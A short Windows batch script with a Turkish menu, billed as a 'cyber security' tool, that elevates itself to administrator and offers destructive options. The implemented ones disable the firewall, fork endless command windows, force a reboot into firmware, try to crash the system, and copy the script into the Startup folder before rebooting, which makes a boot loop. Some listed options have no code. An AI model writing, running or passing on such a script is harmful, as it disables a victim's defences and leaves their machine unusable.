@echo off
title ZYNAX v190 - FINAL
color 04
cls

:: --- ADMIN KONTROLU ---
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :menu
) else (
    echo [!] YONETICI IZNI GEREKIYOR...
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit /b
)

:menu
cls
echo.
echo  #################################################
echo  #          !!! ZYNAX SIBER GUVENLIK !!!         #
echo  #         YAPIMCI: YUSUF  KURULUMSUZ            #
echo  #################################################
echo.
echo  [01] IP ANALIZ          [06] BIOS ZORLA
echo  [02] DISK BOMBASI       [07] PENCERE BOMBASI
echo  [03] MAVI EKRAN         [08] FIREWALL KAPAT
echo  [04] SISTEM SIFIRLA     [09] CPU LOCK
echo  [05] RESET AT           [10] SONSUZ BOOT
echo.
set /p secim="ZyNax_YUSUF > "

if %secim%==1 goto ip
if %secim%==3 goto bsod
if %secim%==6 goto bios
if %secim%==7 goto bomb
if %secim%==8 goto fw
if %secim%==10 goto boot

:ip
curl ip-api.com/line
pause
goto menu

:bsod
powershell wininit
goto menu

:bios
shutdown /r /fw /t 0
goto menu

:bomb
start cmd.exe /k %0
goto bomb

:fw
netsh advfirewall set allprofiles state off
echo [OK] Firewall Kapandi.
pause
goto menu

:boot
copy %0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
shutdown /r /t 0
goto menu
